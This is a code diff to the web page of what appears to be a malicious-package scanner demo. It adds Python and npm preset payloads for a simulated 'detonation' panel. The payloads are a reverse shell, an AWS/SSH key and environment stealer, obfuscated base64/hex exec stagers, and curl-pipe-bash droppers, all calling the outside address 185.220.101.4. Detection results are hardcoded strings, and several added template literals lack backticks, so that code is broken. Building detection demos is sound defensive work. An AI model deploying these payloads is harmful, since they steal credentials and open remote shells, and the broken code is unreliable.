@@ -541,6 +541,7 @@
             </span>
             <div class="flex flex-wrap items-center gap-1.5">
               <button
+                id="judge-btn-revshell"
                 type="button"
                 onclick="loadJudgeExploit('rev_shell')"
                 class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-red-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
@@ -548,6 +549,7 @@
                 <span>⚡ Reverse TCP Shell</span>
               </button>
               <button
+                id="judge-btn-aws"
                 type="button"
                 onclick="loadJudgeExploit('aws_stealer')"
                 class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-amber-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
@@ -555,6 +557,7 @@
                 <span>🔑 AWS Keystore Stealer</span>
               </button>
               <button
+                id="judge-btn-stager"
                 type="button"
                 onclick="loadJudgeExploit('base64_stager')"
                 class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-purple-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
@@ -562,6 +565,7 @@
                 <span>📦 Base64 Exec Stager</span>
               </button>
               <button
+                id="judge-btn-dropper"
                 type="button"
                 onclick="loadJudgeExploit('cmd_dropper')"
                 class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-pink-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
@@ -577,8 +581,8 @@
               rows="5"
               spellcheck="false"
               class="w-full bg-[#161b22] font-mono text-xs text-red-200 border border-slate-700 rounded p-3 focus:outline-none focus:border-red-500 leading-relaxed resize-y selection:bg-red-900 shadow-inner"
-              placeholder="# Exploit: Direct Interactive Reverse TCP Shell&#10;import socket, subprocess, os&#10;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&#10;s.connect(('185.220.101.4', 443))&#10;subprocess.call(['/bin/sh', '-i'])"
-            ># Exploit: Direct Interactive Reverse TCP Shell
+              placeholder="# Exploit: Direct Interactive Reverse TCP Shell (Python setup.py)&#10;import socket, subprocess, os&#10;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&#10;s.connect(('185.220.101.4', 443))&#10;subprocess.call(['/bin/sh', '-i'])"
+            ># Exploit: Direct Interactive Reverse TCP Shell (Python setup.py)
 import socket, subprocess, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("185.220.101.4", 443))
@@ -586,23 +590,23 @@ os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 subprocess.call(["/bin/sh", "-i"])</textarea>
-            <div class="absolute right-3 bottom-3 text-[10px] font-mono text-slate-400 pointer-events-none bg-[#161b22]/90 px-1.5 py-0.5 rounded border border-slate-800">
-              Evaluated In-Memory &middot; Host Keystores Sealed
+            <div id="judge-editor-badge" class="absolute right-3 bottom-3 text-[10px] font-mono text-slate-300 pointer-events-none bg-[#161b22]/95 px-2 py-0.5 rounded border border-slate-700">
+              🐍 PyPI / Python AST &middot; setup.py Lifecycle Hook
             </div>
           </div>
 
           <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-1">
             <div class="flex flex-wrap items-center gap-2">
               <label class="text-[11px] text-slate-400 font-mono">Simulated Target:</label>
-              <select id="judge-exploit-eco" class="bg-slate-800 border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:outline-none cursor-pointer">
-                <option value="pypi">PyPI (Python setup.py / __init__.py)</option>
-                <option value="npm">npm (Node.js index.js / preinstall.js)</option>
+              <select id="judge-exploit-eco" onchange="onJudgeEcoChange()" class="bg-slate-800 border border-slate-600 rounded px-2.5 py-1.5 text-xs text-white font-mono font-semibold focus:outline-none focus:border-red-400 cursor-pointer">
+                <option value="pypi">🐍 PyPI (Python setup.py / __init__.py)</option>
+                <option value="npm">📦 npm (Node.js index.js / preinstall.js)</option>
               </select>
               <input
                 id="judge-exploit-pkg-name"
                 type="text"
                 value="judge-custom-exploit"
-                class="bg-slate-800 border border-slate-700 rounded px-2.5 py-1.5 text-xs font-mono text-slate-200 focus:outline-none w-48"
+                class="bg-slate-800 border border-slate-700 rounded px-2.5 py-1.5 text-xs font-mono text-slate-200 focus:outline-none w-48 font-semibold"
                 placeholder="Simulated package name"
               />
             </div>
@@ -3761,60 +3765,61 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
         if (scoreEl) scoreEl.innerText = '04';
         if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#FFEBE9] border border-[#FF8182] flex flex-col items-center justify-center min-w-[70px]';
         if (cardEl) cardEl.className = 'p-3 rounded-lg border border-red-200 bg-red-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
-        if (titleEl) titleEl.innerText = 'reqeusts v0.1.2';
+        if (titleEl) titleEl.innerText = 'reqeusts v0.1.2 (🐍 PyPI · Python)';
         if (badgeEl) {
           badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#FFEBE9] text-[#CF222E] border border-[#FF8182]';
-          badgeEl.innerText = 'Critical Typosquat & Stealer';
+          badgeEl.innerText = 'Critical PyPI Typosquat & Stealer';
         }
         if (descEl) descEl.innerText = "Typosquats 'requests'. setup.py unpacks Base64 stager, attempts to read ~/.ssh/id_rsa & ~/.aws/credentials, phones home to 185.220.101.4. Intercepted in 0.30s via SIGKILL.";
-        if (distEl) { distEl.innerText = '1 (Adversarial Collision)'; distEl.className = 'text-[#CF222E]'; }
-        if (astEl) { astEl.innerText = 'Base64 Reverse Shell (CWE-95)'; astEl.className = 'text-[#CF222E]'; }
-        if (contEl) { contEl.innerText = 'SIGKILL Terminated (0.30s)'; contEl.className = 'text-[#CF222E]'; }
+        if (distEl) { distEl.innerText = '1 (Adversarial Collision with requests)'; distEl.className = 'text-[#CF222E]'; }
+        if (astEl) { astEl.innerText = 'Base64 Reverse Shell (PyPI setup.py CWE-95)'; astEl.className = 'text-[#CF222E]'; }
+        if (contEl) { contEl.innerText = 'Python PID SIGKILL (0.30s)'; contEl.className = 'text-[#CF222E]'; }
       } else if (pkgName === 'colors-support-v2') {
-        if (scoreEl) scoreEl.innerText = '12';
+        if (scoreEl) scoreEl.innerText = '08';
         if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#FFEBE9] border border-[#FF8182] flex flex-col items-center justify-center min-w-[70px]';
         if (cardEl) cardEl.className = 'p-3 rounded-lg border border-red-200 bg-red-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
-        if (titleEl) titleEl.innerText = 'colors-support-v2 v1.0.0';
+        if (titleEl) titleEl.innerText = 'colors-support-v2 v1.0.0 (📦 npm · Node.js)';
         if (badgeEl) {
           badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#FFEBE9] text-[#CF222E] border border-[#FF8182]';
-          badgeEl.innerText = 'Critical Hex Dropper';
+          badgeEl.innerText = 'Critical npm Hex Dropper';
         }
-        if (descEl) descEl.innerText = "Hex-encoded payload \\x63\\x68\\x69... executes child_process.exec() to exfiltrate /etc/shadow or AWS tokens via Pastebin sinkhole. Quarantined in 0.28s.";
-        if (distEl) { distEl.innerText = 'Namespace Squat on colors'; distEl.className = 'text-[#CF222E]'; }
-        if (astEl) { astEl.innerText = 'Hex Deobfuscated child_process (CWE-78)'; astEl.className = 'text-[#CF222E]'; }
-        if (contEl) { contEl.innerText = 'Seccomp Quarantined (0.28s)'; contEl.className = 'text-[#CF222E]'; }
+        if (descEl) descEl.innerText = "Node.js hex-encoded payload executes child_process.exec() to exfiltrate /etc/shadow and AWS credentials to Pastebin sinkhole. Trapped in 0.28s via Node.js V8 seccomp isolation.";
+        if (distEl) { distEl.innerText = 'Namespace Collision on colors (npm)'; distEl.className = 'text-[#CF222E]'; }
+        if (astEl) { astEl.innerText = 'Hex child_process.exec (Node.js CWE-78)'; astEl.className = 'text-[#CF222E]'; }
+        if (contEl) { contEl.innerText = 'Node.js PID SIGKILL (0.28s)'; contEl.className = 'text-[#CF222E]'; }
       } else if (pkgName === 'requests') {
         if (scoreEl) scoreEl.innerText = '100';
         if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#E6FFEC] border border-[#54A065]/40 flex flex-col items-center justify-center min-w-[70px]';
         if (cardEl) cardEl.className = 'p-3 rounded-lg border border-emerald-200 bg-emerald-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
-        if (titleEl) titleEl.innerText = 'requests v2.31.0';
+        if (titleEl) titleEl.innerText = 'requests v2.31.0 (🐍 PyPI · Python)';
         if (badgeEl) {
           badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#E6FFEC] text-[#1A7F37] border border-[#54A065]/40';
-          badgeEl.innerText = 'Verified Benign Library';
+          badgeEl.innerText = 'Verified Benign PyPI Wheel';
         }
-        if (descEl) descEl.innerText = "Authentic Python HTTP library. Standard library bindings only, zero obfuscated stagers, zero unauthorized socket egress. Sigstore transparency hash verified.";
+        if (descEl) descEl.innerText = "Official Python HTTP library. Standard library bindings only, zero dynamic exec(), zero keystore reads. PSF cryptographic keyring verified.";
         if (distEl) { distEl.innerText = '0 (Canonical Authority)'; distEl.className = 'text-[#1A7F37]'; }
-        if (astEl) { astEl.innerText = 'Pure AST (Zero Dynamic Exec)'; astEl.className = 'text-[#1A7F37]'; }
+        if (astEl) { astEl.innerText = 'Clean Python AST (Zero Obfuscation)'; astEl.className = 'text-[#1A7F37]'; }
         if (contEl) { contEl.innerText = 'Clean Pass (0.18s)'; contEl.className = 'text-[#1A7F37]'; }
       } else if (pkgName === 'lodash') {
         if (scoreEl) scoreEl.innerText = '100';
         if (scoreBox) scoreBox.className = 'px-3 py-1.5 rounded bg-[#E6FFEC] border border-[#54A065]/40 flex flex-col items-center justify-center min-w-[70px]';
         if (cardEl) cardEl.className = 'p-3 rounded-lg border border-emerald-200 bg-emerald-50/50 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs font-sans';
-        if (titleEl) titleEl.innerText = 'lodash v4.17.21';
+        if (titleEl) titleEl.innerText = 'lodash v4.17.21 (📦 npm · Node.js)';
         if (badgeEl) {
           badgeEl.className = 'px-2 py-0.2 rounded text-[11px] font-semibold bg-[#E6FFEC] text-[#1A7F37] border border-[#54A065]/40';
-          badgeEl.innerText = 'Verified Benign Utility';
+          badgeEl.innerText = 'Verified Benign npm Module';
         }
-        if (descEl) descEl.innerText = "Authentic JavaScript utility suite. Standalone pure functions, zero external runtime dependencies, zero access to process.env or system files.";
+        if (descEl) descEl.innerText = "Official JavaScript utility library. Standalone pure functional transforms, zero access to process.env or sensitive system files. OpenJS Foundation signed.";
         if (distEl) { distEl.innerText = '0 (Canonical Authority)'; distEl.className = 'text-[#1A7F37]'; }
-        if (astEl) { astEl.innerText = 'Pure AST (Prototype Hardened)'; astEl.className = 'text-[#1A7F37]'; }
+        if (astEl) { astEl.innerText = 'Clean V8 AST (Zero child_process)'; astEl.className = 'text-[#1A7F37]'; }
         if (contEl) { contEl.innerText = 'Clean Pass (0.15s)'; contEl.className = 'text-[#1A7F37]'; }
       }
     }
 
-    // Judge Attack Testing Ground Presets & Execution Handlers
+    // Differentiated PyPI (Python) vs npm (Node.js) Exploit Payloads
     const JUDGE_EXPLOITS = {
-      rev_shell: `# Exploit: Direct Interactive Reverse TCP Shell
+      pypi: {
+        rev_shell: `# Exploit: Direct Interactive Reverse TCP Shell (Python setup.py)
 import socket, subprocess, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("185.220.101.4", 443))
@@ -3823,7 +3828,7 @@ os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 subprocess.call(["/bin/sh", "-i"])`,
 
-      aws_stealer: `# Exploit: Host Keystore & AWS Secret Exfiltration
+        aws_stealer: `# Exploit: Host Keystore & AWS Secret Exfiltration (Python)
 import os, urllib.request
 aws_creds = open(os.path.expanduser("~/.aws/credentials")).read()
 ssh_keys = open(os.path.expanduser("~/.ssh/id_rsa")).read()
@@ -3831,24 +3836,91 @@ stolen = f"AWS={aws_creds}&SSH={ssh_keys}"
 req = urllib.request.Request("http://185.220.101.4:443/loot", data=stolen.encode())
 urllib.request.urlopen(req)`,
 
-      base64_stager: `# Exploit: Obfuscated Base64 Dynamic Exec Stager
+        base64_stager: `# Exploit: Obfuscated Base64 Dynamic Exec Stager (Python)
 import base64
 payload = "aW1wb3J0IG9zLCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MuUG9wZW4oWydjdXJsJywgJy1zJywgJ2h0dHA6Ly8xODUuMjIwLjEwMS40L2Ryb3AnXSk="
 exec(base64.b64decode(payload))`,
 
-      cmd_dropper: `# Exploit: Subprocess Ingress Stager Dropper
+        cmd_dropper: `# Exploit: Subprocess Ingress Stager Dropper (Python)
 import subprocess, os
 url = "http://185.220.101.4/beacon.sh"
 subprocess.Popen(["curl", "-s", url, "|", "bash"], shell=True)
 os.system("echo 'pwned' > /tmp/pwned.txt")`
+      },
+      npm: {
+        rev_shell: `// Exploit: Node.js net.Socket Reverse TCP Shell (npm preinstall.js)
+const net = require("net");
+const { spawn } = require("child_process");
+const client = new net.Socket();
+client.connect(443, "185.220.101.4", () => {
+  const sh = spawn("/bin/sh", []);
+  client.pipe(sh.stdin);
+  sh.stdout.pipe(client);
+  sh.stderr.pipe(client);
+});`,
+
+        aws_stealer: `// Exploit: Node.js Keystore & Environment Exfiltration (npm)
+const fs = require("fs");
+const https = require("https");
+const path = require("path");
+const os = require("os");
+const aws = fs.readFileSync(path.join(os.homedir(), ".aws/credentials"), "utf8");
+const envData = JSON.stringify(process.env);
+const req = https.request("https://185.220.101.4:443/loot", { method: "POST" });
+req.write(Buffer.from(aws + envData).toString("base64"));
+req.end();`,
+
+        base64_stager: `// Exploit: Obfuscated Hex/Array Child Process Exec (npm colors-style)
+const _0x5a = ["child_process", "exec"];
+const cp = require(_0x5a[0]);
+const encoded = "cz1yZXF1aXJlKCduZXQnKS5Tb2NrZXQoKTtzLmNvbm5lY3QoNDQzLCIxODUuMjIwLjEwMS40Iik=";
+eval(Buffer.from(encoded, "base64").toString());
+cp[_0x5a[1]]("curl -s http://185.220.101.4/payload.sh | bash");`,
+
+        cmd_dropper: `// Exploit: Node.js Lifecycle Subprocess Dropper (npm package.json)
+const { execSync } = require("child_process");
+execSync("curl -s http://185.220.101.4/dropper.sh | bash", { stdio: "ignore" });
+require("fs").writeFileSync("/tmp/pwned.txt", "npm pwned");`
+      }
     };
+
+    function onJudgeEcoChange() {
+      const ecoSelect = document.getElementById('judge-exploit-eco');
+      const eco = (ecoSelect && ecoSelect.value) ? ecoSelect.value : 'pypi';
+      const pkgInput = document.getElementById('judge-exploit-pkg-name');
+      const badgeEl = document.getElementById('judge-editor-badge');
+      const btn1 = document.getElementById('judge-btn-revshell');
+      const btn2 = document.getElementById('judge-btn-aws');
+      const btn3 = document.getElementById('judge-btn-stager');
+      const btn4 = document.getElementById('judge-btn-dropper');
+
+      if (eco === 'npm') {
+        if (pkgInput) pkgInput.value = 'judge-custom-module';
+        if (badgeEl) badgeEl.innerHTML = '📦 npm / Node.js V8 AST &middot; package.json preinstall Hook';
+        if (btn1) btn1.innerHTML = '<span>⚡ Node.js Reverse Shell</span>';
+        if (btn2) btn2.innerHTML = '<span>🔑 fs.readFileSync Stealer</span>';
+        if (btn3) btn3.innerHTML = '<span>📦 Hex/Buffer eval() Stager</span>';
+        if (btn4) btn4.innerHTML = '<span>💉 child_process Dropper</span>';
+      } else {
+        if (pkgInput) pkgInput.value = 'judge-custom-exploit';
+        if (badgeEl) badgeEl.innerHTML = '🐍 PyPI / Python AST &middot; setup.py Lifecycle Hook';
+        if (btn1) btn1.innerHTML = '<span>⚡ Reverse TCP Shell</span>';
+        if (btn2) btn2.innerHTML = '<span>🔑 AWS Keystore Stealer</span>';
+        if (btn3) btn3.innerHTML = '<span>📦 Base64 Exec Stager</span>';
+        if (btn4) btn4.innerHTML = '<span>💉 Subprocess Dropper</span>';
+      }
+
+      loadJudgeExploit('rev_shell');
+    }
 
     function loadJudgeExploit(key) {
       const editor = document.getElementById('judge-exploit-editor');
       const ecoSelect = document.getElementById('judge-exploit-eco');
-      if (editor && JUDGE_EXPLOITS[key]) {
-        editor.value = JUDGE_EXPLOITS[key];
-        if (ecoSelect) ecoSelect.value = 'pypi';
+      const eco = (ecoSelect && ecoSelect.value) ? ecoSelect.value : 'pypi';
+      const exploits = JUDGE_EXPLOITS[eco] || JUDGE_EXPLOITS.pypi;
+
+      if (editor && exploits[key]) {
+        editor.value = exploits[key];
       }
     }
 
@@ -3857,9 +3929,11 @@ os.system("echo 'pwned' > /tmp/pwned.txt")`
       const ecoSelect = document.getElementById('judge-exploit-eco');
       const pkgInput = document.getElementById('judge-exploit-pkg-name');
 
-      const snippet = (editor && editor.value.trim()) ? editor.value.trim() : JUDGE_EXPLOITS.rev_shell;
       const eco = (ecoSelect && ecoSelect.value) ? ecoSelect.value : 'pypi';
-      const pkgName = (pkgInput && pkgInput.value.trim()) ? pkgInput.value.trim().toLowerCase() : 'judge-custom-exploit';
+      const defaultExploit = (JUDGE_EXPLOITS[eco] && JUDGE_EXPLOITS[eco].rev_shell) || JUDGE_EXPLOITS.pypi.rev_shell;
+      const snippet = (editor && editor.value.trim()) ? editor.value.trim() : defaultExploit;
+      const defaultPkg = eco === 'npm' ? 'judge-custom-module' : 'judge-custom-exploit';
+      const pkgName = (pkgInput && pkgInput.value.trim()) ? pkgInput.value.trim().toLowerCase() : defaultPkg;
 
       openLiveDetonationModal(pkgName, snippet, eco);
     }
@@ -3949,29 +4023,39 @@ os.system("echo 'pwned' > /tmp/pwned.txt")`
         ? true 
         : (currentDetonationTarget === 'reqeusts' || currentDetonationTarget.includes('color') || currentDetonationTarget.includes('exploit'));
 
+      const detEco = customEco || ((currentDetonationTarget.includes('color') || currentDetonationTarget === 'lodash' || currentDetonationTarget.includes('module')) ? 'npm' : 'pypi');
+
       if (titleEl) {
         if (customSnippet) {
-          titleEl.innerText = `${currentDetonationTarget} (Custom Injected Exploit)`;
+          titleEl.innerText = detEco === 'npm'
+            ? ${currentDetonationTarget}-1.0.0.tgz (📦 npm Package)
+            : ${currentDetonationTarget}-0.1.2.tar.gz (🐍 PyPI Wheel);
         } else if (currentDetonationTarget === 'colors-support-v2') {
-          titleEl.innerText = 'colors-support-v2-1.0.0.tgz';
+          titleEl.innerText = 'colors-support-v2-1.0.0.tgz (📦 npm Package)';
         } else if (currentDetonationTarget === 'requests') {
-          titleEl.innerText = 'requests-2.31.0-py3-none-any.whl';
+          titleEl.innerText = 'requests-2.31.0-py3-none-any.whl (🐍 PyPI Wheel)';
         } else if (currentDetonationTarget === 'lodash') {
-          titleEl.innerText = 'lodash-4.17.21.tgz';
+          titleEl.innerText = 'lodash-4.17.21.tgz (📦 npm Package)';
         } else {
-          titleEl.innerText = `${currentDetonationTarget}-0.1.2.tar.gz`;
+          titleEl.innerText = detEco === 'npm' ? ${currentDetonationTarget}-1.0.0.tgz (📦 npm) : ${currentDetonationTarget}-0.1.2.tar.gz (🐍 PyPI);
         }
       }
 
       if (familyEl) {
-        if (currentDetonationTarget === 'colors-support-v2') {
-          familyEl.innerText = 'Hex-Encoded Subprocess Dropper (CWE-78 / CWE-200)';
+        if (customSnippet) {
+          familyEl.innerText = detEco === 'npm'
+            ? 'Node.js V8 Subprocess & Keystore Threat (npm preinstall hook)'
+            : 'Python AST Base64 Credential Harvester (PyPI setup.py hook)';
+        } else if (currentDetonationTarget === 'colors-support-v2') {
+          familyEl.innerText = 'Hex-Encoded Subprocess Dropper (CWE-78 / CWE-200 · npm)';
         } else if (currentDetonationTarget === 'requests') {
-          familyEl.innerText = 'Official Verified PyPI Wheel (Clean Architecture)';
+          familyEl.innerText = 'Official Verified PyPI Wheel (Clean PSF Architecture)';
         } else if (currentDetonationTarget === 'lodash') {
-          familyEl.innerText = 'Official Verified npm Package (Clean Architecture)';
+          familyEl.innerText = 'Official Verified npm Package (Clean OpenJS Architecture)';
         } else {
-          familyEl.innerText = 'Base64 Credential Harvester (CWE-200 / CWE-95)';
+          familyEl.innerText = detEco === 'npm'
+            ? 'Node.js Lifecycle Dropper (CWE-78 · npm)'
+            : 'Python Base64 Credential Harvester (CWE-200 / CWE-95 · PyPI)';
         }
       }
 
